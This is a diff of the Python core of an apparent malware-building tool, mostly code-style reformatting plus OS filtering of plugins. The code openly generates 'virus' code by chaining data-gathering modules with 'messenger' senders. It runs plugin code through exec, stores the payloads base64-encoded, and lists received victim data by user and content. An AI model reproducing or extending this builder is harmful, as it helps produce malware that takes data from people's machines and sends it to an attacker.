@@ -1,19 +1,20 @@
-#-*- coding:utf-8 -*-
+# -*- coding:utf-8 -*-
 
-#Importing libs
+# Importing libs
 import re, os, sys, ast, random, base64, time, json, hashlib, platform
 import astunparse
 from lib.ol.main import onelinerize
 from lib.logger import log
-#Importing terminaltables
+import lib
+# Importing terminaltables
 try:
     import terminaltables
 except:
     print("Oops")
 
-#Constants
+# Constants
 ignoreFiles = [".DS_Store", "__init__.py", "config.py"]
-ignoreEnds = ["pyc","uninit"]
+ignoreEnds = ["pyc", "uninit"]
 supportedOS = ["Windows", "Darwin", "Linux"]
 
 # The location of the database
@@ -23,15 +24,16 @@ dataLoc = "db/data.json"
 idf = "!@knicky.%s@!"
 
 
-
 ############################
 #        Config Base       #
 ############################
 class updateBase():
     def __init__(self):
         self.stop = True
+
     def getU(self):
         return self.updateList
+
     def main(self):
         if self.stop or self.bypass:
             try:
@@ -39,18 +41,19 @@ class updateBase():
                 if not self.bypass:
                     if utils.getSHA1(temp) == lib.sha1Info.sg:
                         utils.updateFile(self.fileName,
-                            self.updateList)
+                                         self.updateList)
                         return "Success"
                     else:
                         return ("[!] Error! Template file (%s) is not correct"
-                            % utils.getSHA1(temp))
+                                % utils.getSHA1(temp))
                 utils.updateFile(self.fileName,
-                            self.updateList)
+                                 self.updateList)
                 return "Success"
             except:
                 return "[!] Error! No template file found"
         else:
             return "[!] Please fix errors first"
+
     def stop(self):
         self.stop = False
 
@@ -96,13 +99,13 @@ class utils():
                 >>> convertSupportedOS("['Darwin']")
                 ['Darwin']
         """
-        supportedOS = supportedOS.replace(" ", "")\
+        supportedOS = supportedOS.replace(" ", "") \
             .replace('"', '')
         return supportedOS.split(",")
 
     @classmethod
-    def checkFile(cls, fileLines, 
-        path = "", sender = False):
+    def checkFile(cls, fileLines,
+                  path="", sender=False):
         """
             Check the file and convert it into a dict of important information
             
@@ -161,7 +164,7 @@ class utils():
                         resultTemp["name"] = lineName[0][1]
                         continue
                 if not resultTemp["desc"]:
-                    path = path.replace("module", "")\
+                    path = path.replace("module", "") \
                         .replace("messenger", "").replace("/", "")
                     if len(path) > 0:
                         path = "[%s] " % path
@@ -202,8 +205,8 @@ class utils():
             if not info[k] and k in ["sys", "name", "desc"]:
                 info["success"] = 2
                 info["info"] = k
-                print("[!] No %s has been given in file %s" % (info["info"], 
-                    file))
+                print("[!] No %s has been given in file %s" % (info["info"],
+                                                               file))
         if " " in info["name"]:
             info["success"] = 3
             info["info"] = "Space In Name"
@@ -236,9 +239,9 @@ class utils():
                         reSendFunc = re.compile("def.+?send\(")
                         if reSendFunc.findall(funcCode):
                             funcName = 'send%s%s' % (
-                                info["name"], str(random.randint(0,2000)))
+                                info["name"], str(random.randint(0, 2000)))
                             sendCode = onelinerize(reSendFunc.sub('def %s(' % funcName,
-                                funcCode))
+                                                                  funcCode))
                             exec(sendCode)
                             info["sendCode"] = sendCode
                             info["sendCodeFunc"] = funcName
@@ -274,7 +277,7 @@ class utils():
                 The output of checkContent
         """
         return cls.checkContent(
-            cls.checkModuleInt(info, file), 
+            cls.checkModuleInt(info, file),
             file)
 
     @staticmethod
@@ -304,17 +307,17 @@ class utils():
                         reReceiveFunc = re.compile("def.+?receive\(")
                         if reSendFunc.findall(funcCode):
                             funcName = 'send%s%s' % (
-                                info["name"], str(random.randint(0,2000)))
+                                info["name"], str(random.randint(0, 2000)))
                             sendCode = onelinerize(reSendFunc.sub('def %s(' % funcName,
-                                funcCode))
+                                                                  funcCode))
                             exec(sendCode)
                             info["sendCode"] = sendCode
                             info["sendCodeFunc"] = funcName
                         elif reReceiveFunc.findall(funcCode):
                             funcName = 'receive%s%s' % (
-                                info["name"], str(random.randint(0,2000)))
+                                info["name"], str(random.randint(0, 2000)))
                             receiveCode = reReceiveFunc.sub('def %s(' % funcName,
-                                funcCode)
+                                                            funcCode)
                             exec(receiveCode)
                             info["receiveCode"] = receiveCode
                             info["receiveCodeFunc"] = funcName
@@ -354,7 +357,7 @@ class utils():
                 The output of checkContent
         """
         return cls.checkContent(
-            cls.checkSendInt(info, file), 
+            cls.checkSendInt(info, file),
             file)
 
     @staticmethod
@@ -375,11 +378,11 @@ class utils():
                 if i["name"] == module:
                     if i["success"] == 0:
                         if platform in i["sys"]:
-                            return True 
+                            return True
                         else:
                             print("[!] Module %s is not supporting %s, ignored" % (
                                 module, platform)
-                            )
+                                  )
                             return False
                     else:
                         print("[!] Module %s is not available, ignored" % module)
@@ -405,7 +408,7 @@ class utils():
         except Exception as e:
             print("[x] Error in %s" % dataLoc)
             raise e
-    
+
     @staticmethod
     def getSHA1(content):
         """
@@ -434,13 +437,13 @@ class utils():
         """
         try:
             file = open(fileName, 'r')
-            newFile = open(fileName.replace("uninit", "py"), 
-                "w")
+            newFile = open(fileName.replace("uninit", "py"),
+                           "w")
             for line in file:
                 for updates in updateList:
                     if idf % updates["original"] in line:
-                        line = line.replace(idf % updates["original"], 
-                            updates["after"])
+                        line = line.replace(idf % updates["original"],
+                                            updates["after"])
                 newFile.write(line)
             file.close()
             newFile.close()
@@ -448,13 +451,13 @@ class utils():
             return "[!] Error in updating"
 
 
-
 ############################
 #         Core API         #
 ############################
 class API():
     @staticmethod
-    def getModuleInfo(path='module'):
+    def getModuleInfo(path='module',
+                      _os=['Darwin', 'Windows', 'Linux']):
         """
             Get all information of all modules
             
@@ -466,20 +469,26 @@ class API():
             
         """
         moduleInfo = []
-        for dirpath,dirnames,filenames in os.walk(path):
+        for dirpath, dirnames, filenames in os.walk(path):
             for file in filenames:
-                fullpath = os.path.join(dirpath,file)
-                if not (file in ignoreFiles \
-                    or file.split(".")[-1] in ignoreEnds):
-                    moduleInfo.append(utils.checkModule(
+                fullpath = os.path.join(dirpath, file)
+                if not (file in ignoreFiles\
+                        or file.split(".")[-1] in ignoreEnds):
+                    result = utils.checkModule(
                         utils.checkFile(
                             open(fullpath).readlines(), dirpath
-                        ),fullpath
-                    ))
+                        ), fullpath)
+                    isOSWanted = False
+                    for o in _os:
+                        if o in result['sys']:
+                            isOSWanted = True
+                    if isOSWanted:
+                        moduleInfo.append(result)
         return moduleInfo
 
     @staticmethod
-    def getSendInfo(path='messenger'):
+    def getSendInfo(path='messenger',
+                    _os=['Darwin', 'Windows', 'Linux']):
         """
             Get all information of all messengers
             
@@ -491,23 +500,29 @@ class API():
             
         """
         sendInfo = []
-        for dirpath,dirnames,filenames in os.walk(path):
+        for dirpath, dirnames, filenames in os.walk(path):
             for file in filenames:
-                fullpath = os.path.join(dirpath,file)
+                fullpath = os.path.join(dirpath, file)
                 if not (file in ignoreFiles \
-                    or file.split(".")[-1] in ignoreEnds):
-                        sendInfo.append(utils.checkSend(
-                            utils.checkFile(
-                                open(fullpath).readlines(), dirpath
-                            ),fullpath
-                        ))
+                        or file.split(".")[-1] in ignoreEnds):
+                    result = utils.checkSend(
+                        utils.checkFile(
+                            open(fullpath).readlines(), dirpath
+                        ), fullpath
+                    )
+                    isOSWanted = False
+                    for o in _os:
+                        if o in result['sys']:
+                            isOSWanted = True
+                    if isOSWanted:
+                        sendInfo.append(result)
         return sendInfo
 
     @classmethod
-    def createVirus(cls, moduleList, sendList, 
-        projName, platform = platform.system(),
-        sendPath = 'messenger',
-        modulePath = "module"):
+    def createVirus(cls, moduleList, sendList,
+                    projName, platform=platform.system(),
+                    sendPath='messenger',
+                    modulePath="module"):
         """
             Generate the virus code
             
@@ -542,14 +557,14 @@ class API():
         for i in realModuleList:
             for j in realSendList:
                 execCode += "%s(str(%s()), '%s', '%s');" % (
-                    j["sendCodeFunc"], i["sendCodeFunc"], 
+                    j["sendCodeFunc"], i["sendCodeFunc"],
                     i["name"], projName)
         return moduleCode + sendCode + execCode
 
     @classmethod
     def createReceive(cls, sendList,
-        projName, platform = platform.system(),
-        sendPath = 'messenger'):
+                      projName, platform=platform.system(),
+                      sendPath='messenger'):
         """
             Generate the receiving code
             
@@ -571,20 +586,20 @@ class API():
         execCode = ""
         for realSend in realSendList:
             receiveCode += "%s\n" % (realSend["receiveCode"])
-        
+
         for j in realSendList:
             execCode += "receiveObj = %s(@knicky.RANGE, '%s');" % (
-                    j["receiveCodeFunc"], projName
-                )
+                j["receiveCodeFunc"], projName
+            )
         return receiveCode + execCode
 
     @classmethod
-    def createProj(cls, 
-        moduleList, sendList, platform = platform.system(),
-        projName = str(utils.base64Encode(str(time.time() + 
-            random.randint(0,20000)))).replace("=", ""),
-        sendPath = 'messenger',
-        modulePath = "module"):
+    def createProj(cls,
+                   moduleList, sendList, platform=platform.system(),
+                   projName=str(utils.base64Encode(str(time.time() +
+                                                       random.randint(0, 20000)))).replace("=", ""),
+                   sendPath='messenger',
+                   modulePath="module"):
         """
             Create a virus project
             
@@ -598,14 +613,14 @@ class API():
         print("[*] The project name is %s" % projName)
         data = utils.visitJSON()
         projects = data["projects"]
-        virusCode = cls.createVirus(moduleList, sendList, projName, platform, 
-            sendPath, modulePath)
+        virusCode = cls.createVirus(moduleList, sendList, projName, platform,
+                                    sendPath, modulePath)
         receiveCode = cls.createReceive(sendList, projName, platform, sendPath)
         projects.append({
-            "projName" : projName,
-            "virusCode" : utils.base64Encode(virusCode),
-            "receiveCode" : utils.base64Encode(receiveCode),
-            "time" : time.time()
+            "projName": projName,
+            "virusCode": utils.base64Encode(virusCode),
+            "receiveCode": utils.base64Encode(receiveCode),
+            "time": time.time()
         })
         data["projects"] = projects
         with open(dataLoc, "w") as file:
@@ -673,7 +688,7 @@ class API():
         return virusCode
 
     @classmethod
-    def receiveInfo(cls, projName, _range = 10):
+    def receiveInfo(cls, projName, _range=10):
         """
             Receive the response of the virus
             
@@ -689,9 +704,9 @@ class API():
         if receiveCode == "":
             print("[x] Your entered wrong project name")
             return []
-        else: 
-            exec(receiveCode\
-                .replace("@knicky.RANGE", str(_range)))
+        else:
+            exec(receiveCode \
+                 .replace("@knicky.RANGE", str(_range)))
             return receiveObj
 
 
@@ -699,7 +714,7 @@ class API():
 #       CLI Functions      #
 ############################
 class beautify():
-    #Utils part
+    # Utils part
     @classmethod
     def getTime(cls, timestamp):
         """
@@ -712,8 +727,8 @@ class beautify():
             -------
             
         """
-        return time.strftime("%Y-%m-%d %H:%M:%S", 
-                    time.localtime(float(timestamp)))
+        return time.strftime("%Y-%m-%d %H:%M:%S",
+                             time.localtime(float(timestamp)))
 
     @classmethod
     def tm(cls, result):
@@ -748,7 +763,7 @@ class beautify():
         for i in info:
             if i["success"] == 0:
                 if i["desc"][0] == "[" and "]" in i["desc"]:
-                    desc = i["desc"].replace("[", "%s[" % log.WARNING_COLOR)\
+                    desc = i["desc"].replace("[", "%s[" % log.WARNING_COLOR) \
                         .replace("]", "]%s" % log.END_COLOR)
                 else:
                     desc = i["desc"]
@@ -790,9 +805,9 @@ class beautify():
         """
         result = [["Module", "From User", "Date", "Content"]]
         for i in info:
-            result.append([i["_byModule"], i["_from"], 
-                cls.getTime(i["_date"]), 
-                i["_content"]])
+            result.append([i["_byModule"], i["_from"],
+                           cls.getTime(i["_date"]),
+                           i["_content"]])
         return cls.tm(result)
 
     @classmethod
@@ -812,7 +827,7 @@ class beautify():
             result.append([i["original"], i["desc"]])
         return cls.tm(result)
 
-    #Main part
+    # Main part
     @classmethod
     def showInfo(cls, updateList):
         """
@@ -828,7 +843,8 @@ class beautify():
         return cls.bS(updateList)
 
     @classmethod
-    def getModuleInfo(cls, path='module'):
+    def getModuleInfo(cls, path='module',
+                      _os=['Darwin', 'Linux', 'Windows']):
         """
             Show information of modules
             
@@ -839,11 +855,12 @@ class beautify():
             -------
             
         """
-        info = API.getModuleInfo(path)
+        info = API.getModuleInfo(path=path, _os=_os)
         return cls.bM(info)
 
     @classmethod
-    def getSendInfo(cls, path='messenger'):
+    def getSendInfo(cls, path='messenger',
+                    _os=['Darwin', 'Linux', 'Windows']):
         """
             Show information of messengers
             
@@ -854,7 +871,7 @@ class beautify():
             -------
             
         """
-        info = API.getModuleInfo(path)
+        info = API.getSendInfo(path=path, _os=_os)
         return cls.bM(info)
 
     @classmethod
@@ -873,7 +890,7 @@ class beautify():
         return cls.bC(info)
 
     @classmethod
-    def receiveInfo(cls, projName, _range = 10):
+    def receiveInfo(cls, projName, _range=10):
         """
             Receive information from virus
             
